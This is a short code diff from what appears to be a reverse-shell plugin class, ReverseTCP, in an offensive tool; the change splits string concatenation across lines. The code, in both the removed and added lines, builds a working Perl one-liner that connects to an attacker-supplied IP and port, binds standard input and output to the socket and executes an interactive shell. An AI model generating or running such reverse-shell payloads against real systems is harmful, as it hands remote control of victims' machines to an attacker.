@@ -16,7 +16,7 @@ class ReverseTCP(plugin.ReverseShell):
 
     def make_shell(self):
         self.shell = """perl -e 'use Socket;$i="{}";$p={};""".format(self.args.ip, self.args.port)
-        self.shell += """socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(
-        connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");"""
+        self.shell += """socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,"""
+        self.shell += """sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");"""
         self.shell += """exec("{} -i");""".format(self.args.shell)
         self.shell += """};'"""
